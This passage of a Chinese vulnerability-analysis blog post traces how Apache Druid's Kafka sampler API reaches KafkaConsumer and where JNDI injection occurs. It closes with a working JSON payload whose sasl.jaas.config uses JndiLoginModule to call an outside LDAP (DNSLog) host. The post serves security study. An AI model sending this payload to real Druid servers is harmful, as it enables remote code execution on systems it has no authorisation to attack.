+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//用于配置JSON 序列化和反序列化过程中使用哪种类型信息。该注解是实现多态类型的必要注解。</span><br><span class="hljs-comment">//配置此即可在 json 中通过 type 定义反序列化为子类</span><br><span class="hljs-meta">@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, property = &quot;type&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">SamplerSpec</span>&#123;<br>  SamplerResponse <span class="hljs-title function_">sample</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/kafkadruidimage-4.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>org.apache.druid.indexing.seekablestream.SeekableStreamSamplerSpec实现接口SamplerSpec</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">SeekableStreamSamplerSpec</span><span class="hljs-params">(</span><br><span class="hljs-params">  //ingestionSpec</span><br><span class="hljs-params">  <span class="hljs-keyword">final</span> SeekableStreamSupervisorSpec ingestionSpec,</span><br><span class="hljs-params">  <span class="hljs-meta">@Nullable</span> <span class="hljs-keyword">final</span> SamplerConfig samplerConfig,</span><br><span class="hljs-params">  <span class="hljs-keyword">final</span> InputSourceSampler inputSourceSampler</span><br><span class="hljs-params">)</span><br>&#123;<br><span class="hljs-comment">//ingestionSpec不为空  dataSchema为ingestionSpec.dataSchema</span><br><span class="hljs-built_in">this</span>.dataSchema = Preconditions.checkNotNull(ingestionSpec, <span class="hljs-string">&quot;[spec] is required&quot;</span>).getDataSchema();<br><span class="hljs-comment">//ioConfig不为空</span><br><span class="hljs-built_in">this</span>.ioConfig = Preconditions.checkNotNull(ingestionSpec.getIoConfig(), <span class="hljs-string">&quot;[spec.ioConfig] is required&quot;</span>);<br><span class="hljs-built_in">this</span>.tuningConfig = ingestionSpec.getTuningConfig();<br><span class="hljs-built_in">this</span>.samplerConfig = samplerConfig == <span class="hljs-literal">null</span> ? SamplerConfig.empty() : samplerConfig;<br><span class="hljs-built_in">this</span>.inputSourceSampler = inputSourceSampler;<br>&#125;<br><span class="hljs-comment">//API接口中sample()调用至此</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> SamplerResponse <span class="hljs-title function_">sample</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-keyword">final</span> InputSource inputSource;<br><span class="hljs-keyword">final</span> InputFormat inputFormat;<br><span class="hljs-keyword">if</span> (dataSchema.getParser() != <span class="hljs-literal">null</span>) &#123;<br>  inputSource = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FirehoseFactoryToInputSourceAdaptor</span>(<br>      <span class="hljs-keyword">new</span> <span class="hljs-title class_">SeekableStreamSamplerFirehoseFactory</span>(),<br>      dataSchema.getParser()<br>  );<br>  inputFormat = <span class="hljs-literal">null</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  RecordSupplier&lt;PartitionIdType, SequenceOffsetType, RecordType&gt; recordSupplier;<br>  <span class="hljs-comment">//调用至子类KafkaSamplerSpeccreateRecordSupplier()</span><br>  <span class="hljs-keyword">try</span> &#123;<br>    recordSupplier = createRecordSupplier();<br>  &#125;<br>  <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SamplerException</span>(e, <span class="hljs-string">&quot;Unable to create RecordSupplier: %s&quot;</span>, Throwables.getRootCause(e).getMessage());<br>  &#125;<br><br>  inputSource = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RecordSupplierInputSource</span>&lt;&gt;(<br>      ioConfig.getStream(),<br>      recordSupplier,<br>      ioConfig.isUseEarliestSequenceNumber(),<br>      samplerConfig.getTimeoutMs() &lt;= <span class="hljs-number">0</span> ? <span class="hljs-literal">null</span> : samplerConfig.getTimeoutMs()<br>  );<br>  inputFormat = Preconditions.checkNotNull(<br>      ioConfig.getInputFormat(),<br>      <span class="hljs-string">&quot;[spec.ioConfig.inputFormat] is required&quot;</span><br>  );<br>&#125;<br><br><span class="hljs-keyword">return</span> inputSourceSampler.sample(inputSource, inputFormat, dataSchema, samplerConfig);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/kafkadruidimage-5.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>org.apache.druid.indexing.kafka.KafkaSamplerSpec继承类SeekableStreamSamplerSpec</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//继承类SeekableStreamSamplerSpec</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">KafkaSamplerSpec</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SeekableStreamSamplerSpec</span>&#123;<br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ObjectMapper objectMapper;<br><br>  <span class="hljs-meta">@JsonCreator</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-title function_">KafkaSamplerSpec</span><span class="hljs-params">(</span><br><span class="hljs-params">      //将 json 中 spec 转换为KafkaSupervisorSpec ingestionSpec属性</span><br><span class="hljs-params">      <span class="hljs-meta">@JsonProperty(&quot;spec&quot;)</span> <span class="hljs-keyword">final</span> KafkaSupervisorSpec ingestionSpec,</span><br><span class="hljs-params">      //将 json 中 samplerConfig 转换为SamplerConfig samplerConfig属性</span><br><span class="hljs-params">      <span class="hljs-meta">@JsonProperty(&quot;samplerConfig&quot;)</span> <span class="hljs-meta">@Nullable</span> <span class="hljs-keyword">final</span> SamplerConfig samplerConfig,</span><br><span class="hljs-params">      //值为空注入默认值</span><br><span class="hljs-params">      <span class="hljs-meta">@JacksonInject</span> InputSourceSampler inputSourceSampler,</span><br><span class="hljs-params">      <span class="hljs-meta">@JacksonInject</span> ObjectMapper objectMapper</span><br><span class="hljs-params">  )</span>&#123;<br>    <span class="hljs-comment">//调用父类构造方法  </span><br>    <span class="hljs-comment">//ingestionSpec为 json 中 spec </span><br>    <span class="hljs-built_in">super</span>(ingestionSpec, samplerConfig, inputSourceSampler);<br><br>    <span class="hljs-built_in">this</span>.objectMapper = objectMapper;<br>  &#125;<br><br>  <span class="hljs-comment">//调用至此方法  </span><br>  <span class="hljs-meta">@Override</span><br>  <span class="hljs-keyword">protected</span> KafkaRecordSupplier <span class="hljs-title function_">createRecordSupplier</span><span class="hljs-params">()</span><br>  &#123;<br>    <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">currCtxCl</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>    <span class="hljs-keyword">try</span> &#123;<br>      Thread.currentThread().setContextClassLoader(getClass().getClassLoader());<br>      <span class="hljs-comment">//声明map  将ioConfig中数据添加至map	</span><br>      <span class="hljs-keyword">final</span> Map&lt;String, Object&gt; props = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(((KafkaSupervisorIOConfig) ioConfig).getConsumerProperties());<br>	  <span class="hljs-comment">//向map中插入值</span><br>      props.put(<span class="hljs-string">&quot;enable.auto.commit&quot;</span>, <span class="hljs-string">&quot;false&quot;</span>);<br>      props.put(<span class="hljs-string">&quot;auto.offset.reset&quot;</span>, <span class="hljs-string">&quot;none&quot;</span>);<br>      props.put(<span class="hljs-string">&quot;request.timeout.ms&quot;</span>, Integer.toString(samplerConfig.getTimeoutMs()));<br>      <span class="hljs-comment">//new KafkaRecordSupplier  </span><br>      <span class="hljs-comment">//proos为前面声明的map   objectMapper   ioConfig为ingestionSpec中ioConfig</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">KafkaRecordSupplier</span>(props, objectMapper, ((KafkaSupervisorIOConfig) ioConfig).getConfigOverrides());<br>    &#125;<br>    <span class="hljs-keyword">finally</span> &#123;<br>      Thread.currentThread().setContextClassLoader(currCtxCl);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/kafkadruidimage-6.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>org.apache.druid.indexing.kafka.supervisor.KafkaSupervisorSpec</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@JsonCreator</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">KafkaSupervisorSpec</span><span class="hljs-params">(</span><br><span class="hljs-params">    <span class="hljs-meta">@JsonProperty(&quot;spec&quot;)</span> <span class="hljs-meta">@Nullable</span> KafkaSupervisorIngestionSpec ingestionSchema,</span><br><span class="hljs-params">    <span class="hljs-meta">@JsonProperty(&quot;dataSchema&quot;)</span> <span class="hljs-meta">@Nullable</span> DataSchema dataSchema,</span><br><span class="hljs-params">    <span class="hljs-meta">@JsonProperty(&quot;tuningConfig&quot;)</span> <span class="hljs-meta">@Nullable</span> KafkaSupervisorTuningConfig tuningConfig,</span><br><span class="hljs-params">    //spec json中ioConfig为KafkaSupervisorIOConfig ioConfig</span><br><span class="hljs-params">    <span class="hljs-meta">@JsonProperty(&quot;ioConfig为&quot;)</span> <span class="hljs-meta">@Nullable</span> KafkaSupervisorIOConfig ioConfig,</span><br><span class="hljs-params">    <span class="hljs-meta">@JsonProperty(&quot;context&quot;)</span> Map&lt;String, Object&gt; context,</span><br><span class="hljs-params">    <span class="hljs-meta">@JsonProperty(&quot;suspended&quot;)</span> Boolean suspended,</span><br><span class="hljs-params">    <span class="hljs-meta">@JacksonInject</span> TaskStorage taskStorage,</span><br><span class="hljs-params">    <span class="hljs-meta">@JacksonInject</span> TaskMaster taskMaster,</span><br><span class="hljs-params">    <span class="hljs-meta">@JacksonInject</span> IndexerMetadataStorageCoordinator indexerMetadataStorageCoordinator,</span><br><span class="hljs-params">    <span class="hljs-meta">@JacksonInject</span> KafkaIndexTaskClientFactory kafkaIndexTaskClientFactory,</span><br><span class="hljs-params">    <span class="hljs-meta">@JacksonInject</span> <span class="hljs-meta">@Json</span> ObjectMapper mapper,</span><br><span class="hljs-params">    <span class="hljs-meta">@JacksonInject</span> ServiceEmitter emitter,</span><br><span class="hljs-params">    <span class="hljs-meta">@JacksonInject</span> DruidMonitorSchedulerConfig monitorSchedulerConfig,</span><br><span class="hljs-params">    <span class="hljs-meta">@JacksonInject</span> RowIngestionMetersFactory rowIngestionMetersFactory,</span><br><span class="hljs-params">    <span class="hljs-meta">@JacksonInject</span> SupervisorStateManagerConfig supervisorStateManagerConfig</span><br><span class="hljs-params">)</span><br>&#123;<br>  <span class="hljs-built_in">super</span>(<br>      ingestionSchema != <span class="hljs-literal">null</span><br>      ? ingestionSchema<br>      : <span class="hljs-keyword">new</span> <span class="hljs-title class_">KafkaSupervisorIngestionSpec</span>(<br>          dataSchema,<br>          ioConfig,<br>          tuningConfig != <span class="hljs-literal">null</span><br>          ? tuningConfig<br>          : KafkaSupervisorTuningConfig.defaultConfig()<br>      ),<br>      context,<br>      suspended,<br>      taskStorage,<br>      taskMaster,<br>      indexerMetadataStorageCoordinator,<br>      kafkaIndexTaskClientFactory,<br>      mapper,<br>      emitter,<br>      monitorSchedulerConfig,<br>      rowIngestionMetersFactory,<br>      supervisorStateManagerConfig<br>  );<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>org.apache.druid.indexing.kafka.supervisor.KafkaSupervisorIOConfig</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@JsonCreator</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">KafkaSupervisorIOConfig</span><span class="hljs-params">(</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;topic&quot;)</span> String topic,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;inputFormat&quot;)</span> InputFormat inputFormat,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;replicas&quot;)</span> Integer replicas,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;taskCount&quot;)</span> Integer taskCount,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;taskDuration&quot;)</span> Period taskDuration,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;consumerProperties&quot;)</span> Map&lt;String, Object&gt; consumerProperties,</span><br><span class="hljs-params">  <span class="hljs-meta">@Nullable</span> <span class="hljs-meta">@JsonProperty(&quot;autoScalerConfig&quot;)</span> AutoScalerConfig autoScalerConfig,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;pollTimeout&quot;)</span> Long pollTimeout,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;startDelay&quot;)</span> Period startDelay,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;period&quot;)</span> Period period,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;useEarliestOffset&quot;)</span> Boolean useEarliestOffset,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;completionTimeout&quot;)</span> Period completionTimeout,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;lateMessageRejectionPeriod&quot;)</span> Period lateMessageRejectionPeriod,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;earlyMessageRejectionPeriod&quot;)</span> Period earlyMessageRejectionPeriod,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;lateMessageRejectionStartDateTime&quot;)</span> DateTime lateMessageRejectionStartDateTime,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;configOverrides&quot;)</span> KafkaConfigOverrides configOverrides,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;idleConfig&quot;)</span> IdleConfig idleConfig</span><br><span class="hljs-params">)</span><br>&#123;<br><span class="hljs-built_in">super</span>(<br>    <span class="hljs-comment">//topic不为空</span><br>    Preconditions.checkNotNull(topic, <span class="hljs-string">&quot;topic&quot;</span>),<br>    inputFormat,<br>    replicas,<br>    taskCount,<br>    taskDuration,<br>    startDelay,<br>    period,<br>    useEarliestOffset,<br>    completionTimeout,<br>    lateMessageRejectionPeriod,<br>    earlyMessageRejectionPeriod,<br>    autoScalerConfig,<br>    lateMessageRejectionStartDateTime,<br>    idleConfig<br>);<br><br><span class="hljs-built_in">this</span>.consumerProperties = Preconditions.checkNotNull(consumerProperties, <span class="hljs-string">&quot;consumerProperties&quot;</span>);<br>Preconditions.checkNotNull(<br>    consumerProperties.get(BOOTSTRAP_SERVERS_KEY),<br>    StringUtils.format(<span class="hljs-string">&quot;consumerProperties must contain entry for [%s]&quot;</span>, BOOTSTRAP_SERVERS_KEY)<br>);<br><span class="hljs-built_in">this</span>.pollTimeout = pollTimeout != <span class="hljs-literal">null</span> ? pollTimeout : DEFAULT_POLL_TIMEOUT_MILLIS;<br><span class="hljs-built_in">this</span>.configOverrides = configOverrides;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>org.apache.druid.indexing.kafka.KafkaRecordSupplier</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//构造方法，代码调用至此构造方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">KafkaRecordSupplier</span><span class="hljs-params">(</span><br><span class="hljs-params">  Map&lt;String, Object&gt; consumerProperties,</span><br><span class="hljs-params">  ObjectMapper sortingMapper,</span><br><span class="hljs-params">  KafkaConfigOverrides configOverrides</span><br><span class="hljs-params">)</span><br>&#123;<br><span class="hljs-built_in">this</span>(getKafkaConsumer(sortingMapper, consumerProperties, configOverrides));<br>&#125;<br><br><br><span class="hljs-comment">//构造方法中调用至getKafkaConsumer()</span><br><span class="hljs-comment">//sortingMapper  为KafkaSamplerSpec中objectMapper</span><br><span class="hljs-comment">//consumerProperties  为声明的map props  主要数据均在此map中</span><br><span class="hljs-comment">//configOverrides  为KafkaSamplerSpec  KafkaSupervisorIngestionSpec 中ConfigOverrides</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> KafkaConsumer&lt;<span class="hljs-type">byte</span>[], <span class="hljs-type">byte</span>[]&gt; getKafkaConsumer(<br>  ObjectMapper sortingMapper,<br>  Map&lt;String, Object&gt; consumerProperties,<br>  KafkaConfigOverrides configOverrides<br>)<br>&#123;<br><span class="hljs-keyword">final</span> Map&lt;String, Object&gt; consumerConfigs = KafkaConsumerConfigs.getConsumerProperties();<br><span class="hljs-keyword">final</span> <span class="hljs-type">Properties</span> <span class="hljs-variable">props</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>Map&lt;String, Object&gt; effectiveConsumerProperties;<br><span class="hljs-comment">//    </span><br><span class="hljs-keyword">if</span> (configOverrides != <span class="hljs-literal">null</span>) &#123;<br>  effectiveConsumerProperties = configOverrides.overrideConfigs(consumerProperties);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  effectiveConsumerProperties = consumerProperties;<br>&#125;<br><span class="hljs-comment">//将 effectiveConsumerProperties 中数据添加至 props 中</span><br>addConsumerPropertiesFromConfig(<br>    props,<br>    sortingMapper,<br>    effectiveConsumerProperties<br>);<br>props.putIfAbsent(<span class="hljs-string">&quot;isolation.level&quot;</span>, <span class="hljs-string">&quot;read_committed&quot;</span>);<br>props.putIfAbsent(<span class="hljs-string">&quot;group.id&quot;</span>, StringUtils.format(<span class="hljs-string">&quot;kafka-supervisor-%s&quot;</span>, IdUtils.getRandomId()));<br>props.putAll(consumerConfigs);<br><br><span class="hljs-type">ClassLoader</span> <span class="hljs-variable">currCtxCl</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br><span class="hljs-keyword">try</span> &#123;<br>  Thread.currentThread().setContextClassLoader(KafkaRecordSupplier.class.getClassLoader());<br>  <span class="hljs-type">Deserializer</span> <span class="hljs-variable">keyDeserializerObject</span> <span class="hljs-operator">=</span> getKafkaDeserializer(props, <span class="hljs-string">&quot;key.deserializer&quot;</span>, <span class="hljs-literal">true</span>);<br>  <span class="hljs-type">Deserializer</span> <span class="hljs-variable">valueDeserializerObject</span> <span class="hljs-operator">=</span> getKafkaDeserializer(props, <span class="hljs-string">&quot;value.deserializer&quot;</span>, <span class="hljs-literal">false</span>);<br>  <span class="hljs-comment">//new KafkaConsumer&lt;&gt; props为前端出入数据</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">KafkaConsumer</span>&lt;&gt;(props, keyDeserializerObject, valueDeserializerObject);<br>&#125;<br><span class="hljs-keyword">finally</span> &#123;<br>  Thread.currentThread().setContextClassLoader(currCtxCl);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/kafkadruidimage-7.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="/image/kafkadruidimage-8.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>调用至new KafkaConsumer()</p>
+<p><img src="/image/kafkadruidimage-9.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>JNDI注入成功（此处DNSLog模拟，真实JNDI注入需可访问JNDI恶意服务器，也需要注意JDK版本现限制）</p>
+<p><img src="/image/kafkadruidimage-10.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>精简后payload</p>
+<p>bootstrap.servers 可为任意值</p>
+<p>sasl.jaas.config  值参考上一篇</p>
+<p>topic  不为空</p>
+<p>dataSchema 不为空</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;kafka&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;spec&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;kafka&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;ioConfig&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;kafka&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;consumerProperties&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;bootstrap.servers&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;6.6.6.6:9092&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;security.protocol&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;SASL_SSL&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;sasl.jaas.config&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.security.auth.module.JndiLoginModule required user.provider.url=\&quot;ldap://lc7g01.dnslog.cn\&quot; useFirstPass=\&quot;true\&quot; serviceName=\&quot;x\&quot; group.provider.url=\&quot;xxx\&quot;;&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;topic&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;any&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;dataSchema&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;dataSource&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;sample&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;timestampSpec&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;column&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;!!!_no_such_column_!!!&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;missingValue&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1970-01-01T00:00:00Z&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;dimensionsSpec&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;granularitySpec&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;rollup&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="print-no-link">#漏洞分析</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Kafka命令执行漏洞二-Apache Druid 代码执行漏洞</div>
